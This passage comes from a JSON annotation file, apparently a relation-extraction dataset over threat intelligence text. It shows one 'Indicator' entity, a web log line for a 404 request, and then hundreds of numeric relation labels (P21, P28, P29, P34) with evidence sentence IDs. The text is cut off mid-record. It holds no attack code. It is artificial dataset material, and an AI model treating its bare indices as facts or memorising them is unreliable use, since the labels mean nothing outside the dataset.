"sent_id": 305, "type": "Indicator"}], [{"name": "] \"GET /ifsWcj9a HTTP/1.1\" 404 510 \"-\" \"Opera/5.0 (compatible; MSIE 9.0; Windows NT 6.1; en-GB; SV1)\"", "pos": [146, 176], "sent_id": 305, "type": "Indicator"}]], "labels": [{"r": "P21", "h": 6, "t": 4, "evidence": [22, 29]}, {"r": "P21", "h": 5, "t": 4, "evidence": [22, 29]}, {"r": "P29", "h": 487, "t": 3, "evidence": [19, 166]}, {"r": "P29", "h": 489, "t": 3, "evidence": [19, 167]}, {"r": "P29", "h": 491, "t": 3, "evidence": [19, 168]}, {"r": "P29", "h": 493, "t": 3, "evidence": [19, 168]}, {"r": "P29", "h": 492, "t": 3, "evidence": [19, 168]}, {"r": "P29", "h": 497, "t": 3, "evidence": [19, 171]}, {"r": "P34", "h": 505, "t": 3, "evidence": [19, 193]}, {"r": "P34", "h": 543, "t": 3, "evidence": [19, 239]}, {"r": "P34", "h": 544, "t": 3, "evidence": [19, 239]}, {"r": "P34", "h": 545, "t": 3, "evidence": [19, 239]}, {"r": "P34", "h": 546, "t": 3, "evidence": [19, 239]}, {"r": "P34", "h": 547, "t": 3, "evidence": [19, 240]}, {"r": "P34", "h": 548, "t": 3, "evidence": [19, 240]}, {"r": "P34", "h": 535, "t": 3, "evidence": [19, 214]}, {"r": "P28", "h": 518, "t": 3, "evidence": [19, 204]}, {"r": "P28", "h": 510, "t": 3, "evidence": [19, 203]}, {"r": "P28", "h": 524, "t": 3, "evidence": [19, 205]}, {"r": "P28", "h": 528, "t": 3, "evidence": [19, 206]}, {"r": "P28", "h": 533, "t": 3, "evidence": [19, 209]}, {"r": "P28", "h": 534, "t": 3, "evidence": [19, 210]}, {"r": "P21", "h": 549, "t": 3, "evidence": [19, 304]}, {"r": "P21", "h": 550, "t": 3, "evidence": [19, 304]}, {"r": "P21", "h": 551, "t": 3, "evidence": [19, 304]}, {"r": "P21", "h": 552, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 553, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 554, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 555, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 556, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 557, "t": 3, "evidence": [19, 305]}, {"r": "P21", "h": 7, "t": 3, "evidence": [19, 32]}, {"r": "P21", "h": 8, "t": 3, "evidence": [19, 33]}, {"r": "P21", "h": 9, "t": 3, "evidence": [19, 33]}, {"r": "P21", "h": 10, "t": 3, "evidence": [19, 34]}, {"r": "P21", "h": 11, "t": 3, "evidence": [19, 34]}, {"r": "P21", "h": 12, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 13, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 14, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 15, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 16, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 17, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 18, "t": 3, "evidence": [19, 35]}, {"r": "P21", "h": 19, "t": 3, "evidence": [19, 36]}, {"r": "P21", "h": 20, "t": 3, "evidence": [19, 36]}, {"r": "P21", "h": 21, "t": 3, "evidence": [19, 36]}, {"r": "P21", "h": 22, "t": 3, "evidence": [19, 36]}, {"r": "P21", "h": 23, "t": 3, "evidence": [19, 37]}, {"r": "P21", "h": 24, "t": 3, "evidence": [19, 38]}, {"r": "P21", "h": 25, "t": 3, "evidence": [19, 38]}, {"r": "P21", "h": 26, "t": 3, "evidence": [19, 38]}, {"r": "P21", "h": 27, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 28, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 29, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 30, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 31, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 32, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 33, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 34, "t": 3, "evidence": [19, 39]}, {"r": "P21", "h": 35, "t": 3, "evidence": [19, 40]}, {"r": "P21", "h": 36, "t": 3, "evidence": [19, 40]}, {"r": "P21", "h": 37, "t": 3, "evidence": [19, 40]}, {"r": "P21", "h": 38, "t": 3, "evidence": [19, 40]}, {"r": "P21", "h": 39, "t": 3, "evidence": [19, 41]}, {"r": "P21", "h": 40, "t": 3, "evidence": [19, 42]}, {"r": "P21", "h": 41, "t": 3, "evidence": [19, 42]}, {"r": "P21", "h": 42, "t": 3, "evidence": [19, 43]}, {"r": "P21", "h": 43, "t": 3, "evidence": [19, 43]}, {"r": "P21", "h": 44, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 45, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 46, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 87, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 88, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 89, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 90, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 91, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 92, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 93, "t": 3, "evidence": [19, 45]}, {"r": "P21", "h": 94, "t": 3, "evidence": [19, 45]}, {"r": "P21", "h": 95, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 96, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 97, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 98, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 99, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 100, "t": 3, "evidence": [19, 46]}, {"r": "P21", "h": 101, "t": 3, "evidence": [19, 47]}, {"r": "P21", "h": 102, "t": 3, "evidence": [19, 47]}, {"r": "P21", "h": 103, "t": 3, "evidence": [19, 47]}, {"r": "P21", "h": 104, "t": 3, "evidence": [19, 47]}, {"r": "P21", "h": 105, "t": 3, "evidence": [19, 47]}, {"r": "P21", "h": 106, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 107, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 108, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 109, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 110, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 111, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 112, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 113, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 114, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 115, "t": 3, "evidence": [19, 48]}, {"r": "P21", "h": 116, "t": 3, "evidence": [19, 49]}, {"r": "P21", "h": 117, "t": 3, "evidence": [19, 49]}, {"r": "P21", "h": 118, "t": 3, "evidence": [19, 50]}, {"r": "P21", "h": 119, "t": 3, "evidence": [19, 51]}, {"r": "P21", "h": 120, "t": 3, "evidence": [19, 52]}, {"r": "P21", "h": 121, "t": 3, "evidence": [19, 52]}, {"r": "P21", "h": 122, "t": 3, "evidence": [19, 52]}, {"r": "P21", "h": 123, "t": 3, "evidence": [19, 52]}, {"r": "P21", "h": 124, "t": 3, "evidence": [19, 52]}, {"r": "P21", "h": 125, "t": 3, "evidence": [19, 53]}, {"r": "P21", "h": 126, "t": 3, "evidence": [19, 54]}, {"r": "P21", "h": 127, "t": 3, "evidence": [19, 54]}, {"r": "P21", "h": 128, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 129, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 130, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 131, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 132, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 133, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 134, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 135, "t": 3, "evidence": [19, 55]}, {"r": "P21", "h": 136, "t": 3, "evidence": [19, 56]}, {"r": "P21", "h": 137, "t": 3, "evidence": [19, 56]}, {"r": "P21", "h": 138, "t": 3, "evidence": [19, 56]}, {"r": "P21", "h": 139, "t": 3, "evidence": [19, 56]}, {"r": "P21", "h": 140, "t": 3, "evidence": [19, 56]}, {"r": "P21", "h": 141, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 142, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 143, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 144, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 145, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 205, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 206, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 207, "t": 3, "evidence": [19, 63]}, {"r": "P21", "h": 208, "t": 3, "evidence": [19, 64]}, {"r": "P21", "h": 209, "t": 3, "evidence": [19, 64]}, {"r": "P21", "h": 210, "t": 3, "evidence": [19, 64]}, {"r": "P21", "h": 211, "t": 3, "evidence": [19, 64]}, {"r": "P21", "h": 212, "t": 3, "evidence": [19, 65]}, {"r": "P21", "h": 213, "t": 3, "evidence": [19, 66]}, {"r": "P21", "h": 214, "t": 3, "evidence": [19, 66]}, {"r": "P21", "h": 215, "t": 3, "evidence": [19, 66]}, {"r": "P21", "h": 216, "t": 3, "evidence": [19, 67]}, {"r": "P21", "h": 217, "t": 3, "evidence": [19, 67]}, {"r": "P21", "h": 218, "t": 3, "evidence": [19, 67]}, {"r": "P21", "h": 219, "t": 3, "evidence": [19, 67]}, {"r": "P21", "h": 220, "t": 3, "evidence": [19, 67]}, {"r": "P21", "h": 221, "t": 3, "evidence": [19, 68]}, {"r": "P21", "h": 222, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 223, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 224, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 225, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 226, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 227, "t": 3, "evidence": [19, 69]}, {"r": "P21", "h": 228, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 229, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 230, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 231, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 385, "t": 3, "evidence": [19, 132]}, {"r": "P21", "h": 387, "t": 3, "evidence": [19, 133]}, {"r": "P21", "h": 388, "t": 3, "evidence": [19, 133]}, {"r": "P21", "h": 389, "t": 3, "evidence": [19, 133]}, {"r": "P21", "h": 390, "t": 3, "evidence": [19, 133]}, {"r": "P21", "h": 391, "t": 3, "evidence": [19, 133]}, {"r": "P21", "h": 392, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 393, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 394, "t": 3, "evidence": [19, 134]}, {"r": "P21", "h": 415, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 416, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 418, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 419, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 420, "t": 3, "evidence": [19, 139]}, {"r": "P21", "h": 421, "t": 3, "evidence": [19, 139]}, {"r": "P21", "h": 422, "t": 3, "evidence": [19, 139]}, {"r": "P21", "h": 423, "t": 3, "evidence": [19, 139]}, {"r": "P21", "h": 424, "t": 3, "evidence": [19, 140]}, {"r": "P21", "h": 425, "t": 3, "evidence": [19, 141]}, {"r": "P21", "h": 426, "t": 3, "evidence": [19, 141]}, {"r": "P21", "h": 417, "t": 3, "evidence": [19, 138]}, {"r": "P21", "h": 386, "t": 3, "evidence": [19, 132]}, {"r": "P21", "h": 427, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 428, "t": 3, "evidence": [19, 142]}, {"r": "P21", "h": 481, "t": 3, "evidence": [19, 163]}, {"r": "P21", "h": 482, "t": 3, "evidence": [19, 163]}, {"r": "P21", "h": 483, "t": 3, "evidence": [19, 164]}, {"r": "P21", "h": 484, "t": 3, "evidence": [19, 164]}, {"r": "P21", "h": 485, "t": 3, "evidence": [19, 165]}, {"r": "P21", "h": 486, "t": 3, "evidence": [19, 165]}, {"r": "P21", "h": 457, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 458, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 460, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 461, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 462, "t": 3, "evidence": [19, 148]}, {"r": "P21", "h": 463, "t": 3, "evidence": [19, 149]}, {"r": "P21", "h": 464, "t": 3, "evidence": [19, 150]}, {"r": "P21", "h": 465, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 466, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 467, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 468, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 470, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 471, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 472, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 473, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 474, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 475, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 476, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 477, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 478, "t": 3, "evidence": [19, 152]}, {"r": "P21", "h": 469, "t": 3, "evidence": [19, 151]}, {"r": "P21", "h": 459, "t": 3, "evidence": [19, 147]}, {"r": "P21", "h": 479, "t": 3, "evidence": [19, 152]}, {"r": "P21", "h": 480, "t": 3, "evidence": [19, 152]}, {"r": "P21", "h": 345, "t": 3, "evidence": [19, 107]}, {"r": "P21", "h": 346, "t": 3, "evidence": [19, 107]}, {"r": "P21", "h": 347, "t": 3, "evidence": [19, 108]}, {"r": "P21", "h": 348, "t": 3, "evidence": [19, 109]}, {"r": "P21", "h": 349, "t": 3, "evidence": [19, 109]}, {"r": "P21", "h": 350, "t": 3, "evidence": [19, 110]}, {"r": "P21", "h": 351, "t": 3, "evidence": [19, 110]}, {"r": "P21", "h": 352, "t": 3, "evidence": [19, 111]}, {"r": "P21", "h": 353, "t": 3, "evidence": [19, 111]}, {"r": "P21", "h": 354, "t": 3, "evidence": [19, 112]}, {"r": "P21", "h": 355, "t": 3, "evidence": [19, 112]}, {"r": "P21", "h": 356, "t": 3, "evidence": [19, 113]}, {"r": "P21", "h": 357, "t": 3, "evidence": [19, 114]}, {"r": "P21", "h": 358, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 359, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 360, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 361, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 362, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 363, "t": 3, "evidence": [19, 115]}, {"r": "P21", "h": 364, "t": 3, "evidence": [19, 116]}, {"r": "P21", "h": 365, "t": 3, "evidence": [19, 116]}, {"r": "P21", "h": 366, "t": 3, "evidence": [19, 117]}, {"r": "P21", "h": 367, "t": 3, "evidence": [19, 117]}, {"r": "P21", "h": 368, "t": 3, "evidence": [19, 118]}, {"r": "P21", "h": 369, "t": 3, "evidence": [19, 118]}, {"r": "P21", "h": 370, "t": 3, "evidence": [19, 119]}, {"r": "P21", "h": 371, "t": 3, "evidence": [19, 119]}, {"r": "P21", "h": 372, "t": 3, "evidence": [19, 119]}, {"r": "P21", "h": 373, "t": 3, "evidence": [19, 119]}, {"r": "P21", "h": 374, "t": 3, "evidence": [19, 120]}, {"r": "P21", "h": 375, "t": 3, "evidence": [19, 121]}, {"r": "P21", "h": 376, "t": 3, "evidence": [19, 122]}, {"r": "P21", "h": 377, "t": 3, "evidence": [19, 122]}, {"r": "P21", "h": 378, "t": 3, "evidence": [19, 123]}, {"r": "P21", "h": 379, "t": 3, "evidence": [19, 124]}, {"r": "P21", "h": 380, "t": 3, "evidence": [19, 124]}, {"r": "P21", "h": 381, "t": 3, "evidence": [19, 125]}, {"r": "P21", "h": 382, "t": 3, "evidence": [19, 125]}, {"r": "P21", "h": 383, "t": 3, "evidence": [19, 125]}, {"r": "P21", "h": 384, "t": 3, "evidence": [19, 125]}, {"r": "P21", "h": 286, "t": 3, "evidence": [19, 76]}, {"r": "P21", "h": 287, "t": 3, "evidence": [19, 76]}, {"r": "P21", "h": 288, "t": 3, "evidence": [19, 77]}, {"r": "P21", "h": 289, "t": 3, "evidence": [19, 78]}, {"r": "P21", "h": 290, "t": 3, "evidence": [19, 79]}, {"r": "P21", "h": 291, "t": 3, "evidence": [19, 80]}, {"r": "P21", "h": 292, "t": 3, "evidence": [19, 81]}, {"r": "P21", "h": 293, "t": 3, "evidence": [19, 81]}, {"r": "P21", "h": 294, "t": 3, "evidence": [19, 82]}, {"r": "P21", "h": 295, "t": 3, "evidence": [19, 82]}, {"r": "P21", "h": 296, "t": 3, "evidence": [19, 83]}, {"r": "P21", "h": 297, "t": 3, "evidence": [19, 83]}, {"r": "P21", "h": 298, "t": 3, "evidence": [19, 83]}, {"r": "P21", "h": 299, "t": 3, "evidence": [19, 84]}, {"r": "P21", "h": 300, "t": 3, "evidence": [19, 85]}, {"r": "P21", "h": 301, "t": 3, "evidence": [19, 86]}, {"r": "P21", "h": 302, "t": 3, "evidence": [19, 87]}, {"r": "P21", "h": 303, "t": 3, "evidence": [19, 87]}, {"r": "P21", "h": 304, "t": 3, "evidence": [19, 88]}, {"r": "P21", "h": 305, "t": 3, "evidence": [19, 89]}, {"r": "P21", "h": 306, "t": 3, "evidence": [19, 89]}, {"r": "P21", "h": 307, "t": 3, "evidence": [19, 90]}, {"r": "P21", "h": 308, "t": 3, "evidence": [19, 91]}, {"r": "P21", "h": 309, "t": 3, "evidence": [19, 91]}, {"r": "P21", "h": 310, "t": 3, "evidence": [19, 92]}, {"r": "P21", "h": 311, "t": 3, "evidence": [19, 92]}, {"r": "P21", "h": 312, "t": 3, "evidence": [19, 92]}, {"r": "P21", "h": 313, "t": 3, "evidence": [19, 93]}, {"r": "P21", "h": 314, "t": 3, "evidence": [19, 94]}, {"r": "P21", "h": 315, "t": 3, "evidence": [19, 95]}, {"r": "P21", "h": 316, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 317, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 318, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 319, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 320, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 321, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 322, "t": 3, "evidence": [19, 96]}, {"r": "P21", "h": 323, "t": 3, "evidence": [19, 97]}, {"r": "P21", "h": 324, "t": 3, "evidence": [19, 98]}, {"r": "P21", "h": 325, "t": 3, "evidence": [19, 99]}, {"r": "P21", "h": 326, "t": 3, "evidence": [19, 100]}, {"r": "P21", "h": 327, "t": 3, "evidence": [19, 100]}, {"r": "P21", "h": 328, "t": 3, "evidence": [19, 100]}, {"r": "P21", "h": 329, "t": 3, "evidence": [19, 101]}, {"r": "P21", "h": 330, "t": 3, "evidence": [19, 101]}, {"r": "P21", "h": 331, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 332, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 333, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 334, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 335, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 336, "t": 3, "evidence": [19, 102]}, {"r": "P21", "h": 337, "t": 3, "evidence": [19, 103]}, {"r": "P21", "h": 338, "t": 3, "evidence": [19, 104]}, {"r": "P21", "h": 339, "t": 3, "evidence": [19, 104]}, {"r": "P21", "h": 340, "t": 3, "evidence": [19, 105]}, {"r": "P21", "h": 341, "t": 3, "evidence": [19, 106]}, {"r": "P21", "h": 342, "t": 3, "evidence": [19, 106]}, {"r": "P21", "h": 343, "t": 3, "evidence": [19, 106]}, {"r": "P21", "h": 344, "t": 3, "evidence": [19, 106]}, {"r": "P21", "h": 259, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 260, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 261, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 262, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 263, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 264, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 265, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 266, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 267, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 268, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 269, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 270, "t": 3, "evidence": [19, 72]}, {"r": "P21", "h": 271, "t": 3, "evidence": [19, 73]}, {"r": "P21", "h": 272, "t": 3, "evidence": [19, 73]}, {"r": "P21", "h": 273, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 274, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 275, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 276, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 277, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 278, "t": 3, "evidence": [19, 74]}, {"r": "P21", "h": 279, "t": 3, "evidence": [19, 75]}, {"r": "P21", "h": 280, "t": 3, "evidence": [19, 75]}, {"r": "P21", "h": 281, "t": 3, "evidence": [19, 75]}, {"r": "P21", "h": 282, "t": 3, "evidence": [19, 75]}, {"r": "P21", "h": 283, "t": 3, "evidence": [19, 76]}, {"r": "P21", "h": 284, "t": 3, "evidence": [19, 76]}, {"r": "P21", "h": 285, "t": 3, "evidence": [19, 76]}, {"r": "P21", "h": 47, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 48, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 49, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 50, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 51, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 52, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 53, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 54, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 55, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 56, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 57, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 58, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 59, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 60, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 61, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 62, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 63, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 64, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 65, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 66, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 67, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 68, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 69, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 70, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 71, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 72, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 73, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 74, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 75, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 76, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 77, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 78, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 79, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 80, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 81, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 82, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 83, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 84, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 85, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 86, "t": 3, "evidence": [19, 44]}, {"r": "P21", "h": 146, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 147, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 148, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 149, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 150, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 151, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 152, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 153, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 154, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 155, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 156, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 157, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 158, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 159, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 160, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 161, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 162, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 163, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 164, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 165, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 166, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 167, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 168, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 169, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 170, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 171, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 172, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 173, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 174, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 175, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 176, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 177, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 178, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 179, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 180, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 181, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 182, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 183, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 184, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 185, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 186, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 187, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 188, "t": 3, "evidence": [19, 57]}, {"r": "P21", "h": 189, "t": 3, "evidence": [19, 58]}, {"r": "P21", "h": 190, "t": 3, "evidence": [19, 59]}, {"r": "P21", "h": 191, "t": 3, "evidence": [19, 59]}, {"r": "P21", "h": 192, "t": 3, "evidence": [19, 60]}, {"r": "P21", "h": 193, "t": 3, "evidence": [19, 60]}, {"r": "P21", "h": 194, "t": 3, "evidence": [19, 60]}, {"r": "P21", "h": 195, "t": 3, "evidence": [19, 60]}, {"r": "P21", "h": 196, "t": 3, "evidence": [19, 60]}, {"r": "P21", "h": 197, "t": 3, "evidence": [19, 61]}, {"r": "P21", "h": 198, "t": 3, "evidence": [19, 61]}, {"r": "P21", "h": 199, "t": 3, "evidence": [19, 61]}, {"r": "P21", "h": 200, "t": 3, "evidence": [19, 61]}, {"r": "P21", "h": 201, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 202, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 203, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 204, "t": 3, "evidence": [19, 62]}, {"r": "P21", "h": 232, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 233, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 234, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 235, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 236, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 237, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 238, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 239, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 240, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 241, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 242, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 243, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 244, "t": 3, "evidence": [19, 70]}, {"r": "P21", "h": 245, "t": 3, "evidence": [19, 70]}, {"r": 